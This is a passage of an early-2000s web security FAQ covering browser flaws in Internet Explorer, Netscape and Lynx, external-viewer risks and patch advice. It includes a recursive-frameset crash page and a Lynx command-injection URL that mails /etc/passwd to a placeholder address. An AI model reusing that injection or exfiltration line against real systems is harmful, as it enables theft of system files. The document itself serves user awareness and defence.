+server doesn't guess your password, it has still collected other
+useful information about you: the name of your computer, your user
+name, and the name of your Windows domain.  Because the source code to
+a Unix-based Windows filesharing server is widely available, it is
+relatively easy to create a modified server of this sort.
+
+<p>
+
+In the case of the bug discovered by Steve Birnbaum, the password
+isn't even encrypted.  It's sent to the malicious server in plaintext
+form.  This is because Windows 95 uses a less sophisticated
+authentication system that that described above.
+
+<p>
+
+How can you tell if your password has been stolen in this way?  You
+can't.  The malicious URL can be hidden in an image.  Unless you
+examine the source code for every page you download, the image will
+look no different from any other picture on the Web.  Users running
+non-Windows browsers will see the "broken image" icon -- hardly
+something to raise suspicions.
+
+<p>
+
+What can you do to avoid this problem?  Until Microsoft and Netscape
+correct this bug there's not very much you can do.  Your best bet is
+to choose a good login password.  Make it long, and make it hard to
+guess.  One technique is to choose a phrase that is meaningful to
+yourself but not to anyone else, for example:
+
+<blockquote>
+blue wire chair too cold in AM
+</blockquote>
+
+Now use the first letter (or the third or last) of each word, creating
+the password <strong>bwctciA</strong>.  Don't share this password with
+anyone, and don't use it for anything but LAN login.
+
+<hr>
+
+<h2><a name="CLT-Q14">Q14: Are there any known problems in Microsoft
+Internet Explorer?</a></h2>
+
+There are a variety of security risks in Internet Explorer that
+involve the <a href="#CLT-Q8">JavaScript</a>, <a
+href="#CLT-Q7">Java</a> and <a href="#CLT-Q9">ActiveX</a> subsystems.
+These risks can be removed by turning off those features or installing
+desktop active content protection software.  This section discusses
+problems that are part of the core browser software and cannot be so
+easily avoided.<h3>Certificate Spoofing, MIME Headers, Cached Content,
+Version 5.5</h3>
+
+<p>
+
+Microsoft Internet Explorer 5.5 (Windows 95, Windows NT,
+Macintosh and Unix versions) suffer from a series of programming flaws related
+to features. For certificate validation, the CRL check that is performed is
+flawed and as a result, the certificates expiration date, issuer, and hostname
+checks could all possibly be improperly validated.&nbsp; For more information,
+and the patch, see <a href="http://www.microsoft.com/technet/treeview/default.asp?url=/technet/security/bulletin/MS01-027.asp">Microsoft's
+security bulletin.</a></p>
+
+<p>Since HTML email's are really just 'web' pages, when using IE for email,
+there is a vulnerability whereby a malicious MIME type could be specified for an
+email attachment, and upon reading the email, IE would lauch a program unchecked
+that was included as a part of the email. This would allow a malicious user to
+send you a program in email that IE would automatically run. For more
+information, and the patch, see <a href="http://www.microsoft.com/technet/treeview/default.asp?url=/technet/security/bulletin/MS01-020.asp">Microsoft's
+security bulletin.</a></p>
+
+<p>Since retrieved content is cached, IE retains the information from where it
+came. IE 5.5 has a vulnerability whereby the location of the cached content can
+be learned and therefore web pages may be put together that would cause cached
+content to be launched without being checked as to from where it came. The
+security mechanisms normally associated with controlling Internet content that
+is cached are bypassed, and the content run as if coming from the local machine
+(which is far more permissive). For more information, and the patch, see <a href="http://www.microsoft.com/technet/treeview/default.asp?url=/technet/security/bulletin/MS01-015.asp">Microsoft's
+security bulletin.</a></p>
+
+<h3>HTML Help, Version 5</h3>
+
+<p>
+
+Microsoft Internet Explorer 5 and 5.5 (Windows 95, Windows NT,
+Macintosh and Unix versions) suffer from a series of programming flaws related
+to features each provides. The HTML Help function relies on help files
+originally written as web pages, which if altered in some way can then cause
+malicious programs to run. This&nbsp;</p>
+
+<h3>Buffer Overflow Bugs, Versions 4.0, 4.01</h3>
+
+Microsoft Internet Explorer 4.0 and 4.01 (Windows 95, Windows NT,
+Macintosh and Unix versions) suffer from a series of programming flaws
+in the way the software parses and decodes certain HTML tags.  A
+knowledgeable Web page author can exploit this bug to cause Internet
+Explorer to crash when you download a particular page or view an
+image.  Specifically, these bugs involve the allocation of a static
+region of memory, known as a buffer, to hold a URL or other HTML
+element.  When the browser tries to process an element that is longer
+than the buffer was designed to hold, the browser overruns the region
+and the program crashes.  This type of memory allocation bug is among
+the most common programming problems known, and has been the cause of
+a variety of security holes in CGI scripts and Web servers.  See <a href="wwwsf4.html#Q6">safe CGI scripting</a> for more details.
+
+<p>
+
+The bug has reared its head several times since January of 1998.  The
+first incarnation, called the "mk" bug, involves the special "mk:"
+URLs that invoke the Microsoft help system.  This bug was patched, but
+anoother variant reared its head soon after.  Then, in April 1998, a
+bug involving processing the &lt;EMBED&gt; tag was discovered.
+
+<p>
+
+This class of bug can have serious consequences.  A knowledgeable Web
+author can exploit this bug to execute arbitrary machine code on your
+machine without your knowledge.  The code can do anything, including
+installing viruses, tampering with files, or patching your copy of
+Internet Explorer in order to disable other security features.
+Changing the browser's security settings or disabling active documents
+have no effect on these bugs.  Fortunately a patch for all known
+memory overflow bugs is now available at Microsoft's Web site, at <a
+href="http://www.microsoft.com/security/">http://www.microsoft.com/security/</a>.
+If you use any version of Internet Explorer through 4.01, you should
+download the patch and apply it.  Another alternative is to downgrade
+to a Internet Explorer 3.02, which has been around longer and has no
+known outstanding security issues.
+
+<p>
+
+Further information on Internet Explorer's buffer overflow bugs can be
+found at:
+
+<blockquote>
+<a href="http://l0pht.com/advisories/">http://l0pht.com/advisories/</a>
+</blockquote>
+
+<h3>Recursive Frames Bug, Versions 4.0-4.01 (April 1998)</h3>
+
+Microsoft Internet Explorer doesn't correctly detect and handle
+"recursive" frames.  To understand what a recursive frame is, consider
+an HTML file named <cite>recursive.htm</cite>.  This file contains
+code like the following:
+
+<blockquote><pre>
+&lt;HTML&gt;
+&lt;FRAMESET COLS=&quot;*,*&quot;&gt;
+   &lt;FRAME SRC=&quot;recursive.htm&quot;&gt;
+   &lt;FRAME SRC=&quot;recursive.htm&quot;&gt;
+&lt;/FRAMESET&gt;
+&lt;/HTML&gt;
+</pre></blockquote>
+
+This page defines two side-by-side frames, each of which refers back
+to the original document.  When Internet Explorer sees this frameset,
+it tries to load the document into each of the frames.  Then it tries
+to create subframes within each frame, and sub-subfames within those.
+This continues <cite>ad infinitum</cite> until IE runs out of memory
+and crashes.
+
+<p>
+
+This type of page can be used to cause an annoying browser crash, but
+does not otherwise compromise security.  Reportedly certain versions
+of Netscape Navigator are also vulnerable, but the 4.0X series does
+not appear to be affected.
+
+<h3>"Shortcut Bug", Versions 3.01 and Earlier</h3>
+
+In addition to the LAN password bug, Microsoft Internet Explorer
+versions 3.01 and earlier contains a serious bug that allows any
+command on your computer to be executed by remote control.  Anything,
+up to and including the deletion of the contents of your hard disk, is
+possible: you need only click on a link leading to a malicious URL.
+Worse, the bug can be easily exploited by people who have no
+particular programming skills.
+
+<p>
+
+The problem is the result of a "feature" buried in IE.  Shortcut files
+are ordinarily created by individuals in order to quickly access files
+and programs on their local machines.  If a shortcut file is copied
+onto a Web server and accessed over the Internet, clicking on a link
+to the shortcut has the surprising effect of opening a copy of the
+file (if it exists) on the <em>local user's</em> machine.  If the file
+is an executable program, such as the Windows registry editor or the
+DOS command interpreter, this can result in potentially dangerous
+programs being run on the user's computer without his knowledge or
+consent.  It is also possible for a malicious individual to wrap
+several commands into a .BAT file, arrange for it to be stored in the
+unsuspecting user's browser cache, and then to have this file
+executed.
+
+<p>
+
+The bug affects both Windows 95 and Windows NT systems, and is present
+even if the you choose the highest level of security.  It is unrelated
+to ActiveX or Java.  In addition to links
+inside HTML files, the bug affects hot links embedded in newsgroup
+postings and e-mail messages.
+
+<p>
+
+The bug was discovered by Paul Greene, and further researched with the
+help of Geoffrey Elliot and Brian Morin.  You can find further details
+(including dramatic examples) at <a
+href="http://www.cybersnot.com/iebug.html">http://www.cybersnot.com/iebug.html</a>.
+
+<p>
+
+If you are running IE 3.01 or earlier, you are strongly advised to
+apply a patch provided by Microsoft Corporation, which can be
+downloaded from <a
+href="http://www.microsoft.com/ie/security/update.htm">http://www.microsoft.com/ie/security/update.htm</a>.
+After applying the patch, make sure that your copy of IE was correctly
+updated by selecting "About Internet Explorer" from the Help menu.  It
+should indicate that you are running version "3.01b".  With the patch
+in place, IE will warn you before opening a shortcut file.  In
+general, you should refuse to open any shortcut file downloaded from
+the Internet.
+
+<p>
+
+Here's a simple test of whether you're running a patched version of
+Internet Explorer.  Try to open the link below.  If you get a message
+that warns you that you are attempting to run a binary file and asks
+you whether to "Open" or "Save" it, then you are using a patched
+version of I.E.  If the Notepad application opens then you have a
+problem.
+
+<blockquote>
+<pre>
+<a href="file:///C:\WINDOWS\NOTEPAD.EXE">file:///C:\WINDOWS\NOTEPAD.EXE</a>
+</pre>
+</blockquote>
+
+<p>
+
+As of 3/14/97, Microsoft's fix also handles the problem of shortcut
+files attached to e-mail messages and news postings.  The
+original patch did not take care of the latter problems.
+
+<p>
+
+On a side note, Microsoft's avowed plan to blur the distinction
+between the Internet and the desktop has a dark side.  When it is
+difficult to distinguish between untrusted software that originates
+"out there" and trusted software that lives on the local disk, users
+can easily be led into making mistakes that open up their machines to
+a variety of attacks.  In my opinion, this strategy is one that is
+fraught with risks.
+
+<p>
+
+A Internet Explorer security FAQ is taking shape at the  following
+address:
+
+<blockquote><pre>
+<a href="http://www.nwnetworks.com/iesf.html">http://www.nwnetworks.com/iesf.html</a>
+</pre></blockquote>
+
+Check here for more information about IE security problems.
+
+<hr>
+
+<h2><a name="CLT-Q15">Q15: Are there any known problems in Netscape 6/Communicator/Navigator?</a></h2>
+
+There are a variety of security risks in Netscape browsers that
+involve the <a href="#CLT-Q8">JavaScript</a> and <a
+href="#CLT-Q7">Java</a> interpreters.  You can avoid these risks by
+turning off those features or installing desktop active content
+protection software.  This section discusses known problems that are
+part of the core browser software and cannot be so easily avoided.
+
+<h3>eMail WireTapping Exploit, v6</h3>
+
+<p>The Netscape 6 Mail facilities have an undesireable capability whereby an
+electronic mail containing a specific JavaScript attachment would cause the
+recipient of the message to be copied on all forwarding of the message. This is
+fixed in <a href="http://home.netscape.com/download/index.html?cp=scimd">Netscape
+6.01.</a></p>
+
+<h3>Brown Orifice (August 2000), v4</h3>
+
+<p>Brown Orifice (named after the famed Black Orifice) is an exploit whereby a
+specific Java applet downloaded to the Netscape browser causes the
+browser/computer to act as a web server listening on a particular port. The
+result: your machine would be able to server up directory listings and file
+contents purely because you visited a malicious web site. Netscape released <a href="http://home.netscape.com/computing/download/index.html?cp=scimid">Communicator
+4.76</a> to fix this problem.</p>
+
+<h3>Buffer Overflow Bugs (April 1998), v4</h3>
+
+In the wake of the buffer overflow bugs identified in <a
+href="#CLT-Q14">Internet Explorer</a>, people have gone looking for
+similar bugs in Netscape's products.  Not surprisingly, they have been
+successful.
+
+<p>
+
+Currently the only known bug involves the bookmark file.  Netscape
+Communicator allocates a fixed size buffer to hold the titles of
+bookmarked pages.  If a page has an unusually long title and you
+bookmark it, Netscape will crash the next time you try to access that
+bookmark.  Like the Internet Explorer bugs, this hole could be used to
+trick the browser into executing arbitrary code.
+
+<p>
+
+It is not known at this time what versions of Netscape are vulnerable.
+Versions 4.03 and 4.04 on Windows 95 and NT systems are known to
+contain the bug.  The status of the Macintosh and Unix ports is not
+known.  Currently there is no patch for this bug (April 13, 1998).
+However you can avoid it by examining pages carefully before
+bookmarking them.  If the page has a title that is unusually long or
+contains strange characters, you should be suspicious.
+
+<hr>
+
+<h2><a name="CLT-Q16">Q16: Are there any known problems with Lynx for
+Unix?</a></h2>
+
+<b>Syslog, 2.8.3dev 9</b>
+<p>Syslog information sent from Lynx, in this development release, can include
+embedded passwords (say, a request for <a href="ftp://jns:foopassword@ftp.test.com">ftp://jns:foopassword@ftp.test.com</a>).
+The fix was inserted for dev 9, which is far older than the 2.8.3 release
+candidate and therefore you should upgrade to 2.8.3rel1.1</p>
+<p><b>LynxDownload, 2.7.1</b></p>
+<p>
+
+Versions of Lynx through 2.7.1 contain a very ugly hole that allows a
+Web author to execute arbitrary commands on the user's machine, simply
+by crafting a <cite>LYNXDOWNLOAD</cite> URL containing backtick
+characters.  For example, selecting this URL will cause the contents
+of the system password file to be mailed out across the Internet:</p>
+
+<blockquote><pre>
+&lt;
+a href=&quot;LYNXDOWNLOAD://Method=-1/File=`mail%20hackers@hack.com%3C/etc/passwd`/SugFile=test&quot;&gt;
+CLICK HERE
+&lt;/a&gt;
+</pre></blockquote>
+
+This is an example of <a href="wwwsf4.html#Q6">failing to check
+user-provided parameters for the presence of shell metacharacters</a>,
+a problem that has plagued CGI developers for years.
+
+<p>
+
+Upgrade to a more recent version of Lynx as soon as you can.
+
+<hr>
+
+<H2><a NAME="CLT-Q17">Q17: Someone suggested I configure /bin/csh as a viewer
+for documents of type application/x-csh.  Is this a good idea?</a></H2>
+
+This is not a good idea.  Configuring any command-line shell,
+interpreter, macro processor, of scripting language processor as the
+"viewer" for a document type leaves you vulnerable to attack over the
+Web.  You should never blindly execute any program you download from
+the Internet (including programs obtained by FTP).  It is safer to
+download a script as text, look it over to make sure it isn't doing
+anything malicious, and then run it by hand.
+
+<p>
+These words of warning apply also to the macro worksheets generated by
+popular PC spreadsheet programs.  Although it seems natural to declare
+a type "application/x-msexcel-macro" in order to receive spreadsheets
+that automatically recalculate themselves, some of the functions in
+the Excel macro language have the potential to inflict damage on other
+worksheets and files.  These warnings even apply to such seemingly innocuous
+things as word processor style sheets and template files!  Many high end word
+processors have a built-in macro processing
+ability.  An example of the way in which word processing macros can be
+misused is the Microsoft Word <A
+HREF="http://www.research.ibm.com/xw-D953-wconc">
+"prank macro"</A>, which has the ability to spread, virus-like, from
+document to document.
+<p>
+I have heard of at least one individual who decided he'd only be using
+the C-shell to download scripts written by himself and other trusted
+parties.  He screened all URLs by hand to make sure they didn't end
+with a <CODE>.csh</CODE> extension before downloading them.
+Unfortunately the file extension is not a reliable way to determine
+what a URL contains.  The type of a document is determined by the Web
+(HTTP) server, not the browser, and a document of type application/x-csh
+can just as easily have an extension of <CODE>.txt</CODE> or no
+extension at all.
+
+<p>
+In short, beware of declaring an external viewer for any file that contains
+executable statements.
+<p>
+This security problem is addressed by scripting languages as <A
+HREF="http://java.sun.com">Java</A> and
+<A HREF="http://www.sunlabs.com/research/tcl/">Safe Tcl</A> in which
+dangerous functions can be disabled.  There's even a prototype
+<A HREF="ftp://ftp.ox.ac.uk/pub/perl/README.Safe">"Safe Perl"</A> that
+can be used as a safer external viewer for perl programs.
+
+<HR>
+
+<H2><A NAME="CLT-Q18">Q18: Is there anything else I should keep in mind
+regarding external viewers?</A></H2>
+
+Yes.  Whenever you upgrade a program that you've configured as an
+external viewer you should think about the issues related in the <a href="wwwsf2.html">Client
+Security</a> section in light of the program's new features.  For
+example, if the viewer is a word processor, and the new version has
+just added scripting/macro features, is there any chance that loading and
+displaying the document could automatically launch a script?
+
+<HR>
+
+<table width="100%">
+<tr>
+  <td>
+  <td align="center"><A HREF="index.html#contents">
+      <img src="i/up.gif" align="middle" width=20 height=22 border=0 alt="^ "
+      >Up to <cite>Table of Contents</cite></A><br>
+  <td>
+<tr>
+  <td align=left>
+  <a HREF="wwwsf1.html">
+      <img src="i/left.gif" align="middle" width=20 height=22 border=0 alt="&lt;&lt; "
+      >Back to <cite>General Questions</cite></a><br>
+  <td>
+  <td align=right>  <a HREF="wwwsf3.html">Forward to <cite>Server Side Security</cite><img
+      src="i/right.gif" align="middle" width=20 height=22 border=0 alt=" &gt;&gt;"></a><br>
+</table>
+
+<HR>
+
+<p>
+
+<address><A HREF="http://www.genome.wi.mit.edu/~lstein/">Lincoln D. Stein</A>
+(<a href="mailto:lstein@cshl.org">lstein@cshl.org</a>) and <a href="mailto:jns@digitalisland.net">John
+  N. Stewart (jns@digitalisland.net)</a><br>
+</address>
+
+<p>
+
+<tt>$Id: wwwsf2.html,v 1.6 2001/07/28 17:54:26 lstein Exp $</tt>
+</body> </html>
